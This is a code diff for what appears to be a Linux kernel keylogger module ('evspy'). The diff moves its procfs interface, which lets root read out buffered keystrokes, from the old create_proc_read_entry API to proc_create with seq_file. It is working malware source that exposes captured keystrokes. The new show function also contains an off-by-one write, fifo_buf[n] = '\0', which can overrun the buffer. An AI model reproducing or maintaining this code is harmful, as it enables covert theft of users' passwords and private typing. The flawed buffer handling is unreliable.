@@ -25,6 +25,7 @@
 
 
 DECLARE_KFIFO(cbuffer, char, EVS_BUFSIZE);
+char fifo_buf[EVS_BUFSIZE];
 
 static unsigned short int capslock_on = 0;
 static unsigned short int shift_on = 0;
@@ -32,35 +33,6 @@ static unsigned short int shift_on = 0;
 static unsigned short int altgr_on = 0;
 #endif
 
-/*
- * Executed when the procfs file is read (EVS_PROCNAME)
- */
-static int evspy_read_proc(char *page, char **start, off_t offset, int count,
-                           int *eof, void *data)
-{
-    int n;
-
-    if (current_uid() || current_euid()) {              // root only plz
-#if EVS_TROLL == 1
-        n = 36;
-        if (offset)
-            *eof = 1;
-        else
-            strncpy(page, "Trololololo lololo lololo\nhohohoho\n", n);
-#else
-        return -EPERM;
-#endif
-    } else {            // copy fifo contents to the supplied buffer
-        if (offset + count > PAGE_SIZE)
-            count = PAGE_SIZE - offset;
-
-        n = offset + kfifo_out(&cbuffer, page+offset, count);
-
-        if (kfifo_is_empty(&cbuffer))
-            *eof = 1;
-    }
-    return n;
-}
 
 /*
  * Handle unknown/special key events
@@ -231,9 +203,42 @@ static struct input_handler evspy_handler = {
     .id_table = evspy_ids,
 };
 
+/*
+ * Executed when the procfs file is read (EVS_PROCNAME)
+ */
+static int evspy_proc_show(struct seq_file *m, void *v) /* TODO */
+{
+    if (!uid_eq(current_uid(), GLOBAL_ROOT_UID) ||
+        !uid_eq(current_euid(), GLOBAL_ROOT_UID)) { // root only plz
+#if EVS_TROLL == 1
+        seq_printf(m, "Trololololo lololo lololo\n");
+#else
+        return -EPERM;
+#endif
+    } else {                    // copy fifo contents to the supplied buffer
+        int n = kfifo_out(&cbuffer, fifo_buf, kfifo_size(&cbuffer));
+        fifo_buf[n] = '\0';
+        seq_puts(m, fifo_buf);
+    }
+
+    return 0;
+}
+
+static int evspy_proc_open(struct inode *inode, struct file *file)
+{
+    return single_open(file, evspy_proc_show, PDE_DATA(inode));
+}
+
+static const struct file_operations evspy_proc_fops = {
+    .open = evspy_proc_open,
+    .read = seq_read,
+    .llseek = seq_lseek,
+    .release = seq_release,
+};
+
 static int __init evspy_init(void)
 {
-    create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);
+    proc_create(EVS_PROCNAME, 0, NULL, &evspy_proc_fops);
     init_shiftmap();
 #ifdef EVS_ALTGR_ENABLED
     init_altgrmap();
